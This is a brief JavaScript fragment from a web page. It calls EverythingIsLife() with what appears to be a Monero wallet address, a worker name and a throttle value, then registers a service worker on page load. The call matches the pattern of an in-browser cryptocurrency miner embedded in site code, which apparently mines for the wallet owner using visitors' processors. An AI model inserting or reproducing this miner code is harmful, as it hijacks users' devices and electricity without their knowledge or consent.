
let xmr = "";
    xmr = EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'paw', 50);
  
  
  const container = 
document.getElementById('.container').innerHTML = xmr;
  
if ("serviceWorker" in navigator) {
  window.addEventListener("load", function() {
    navigator.serviceWorker
      .register("/serviceWorker.js")
      .then(res => console.log("service worker registered"))
      .catch(err => console.log("service worker not registered", err));
  });
}
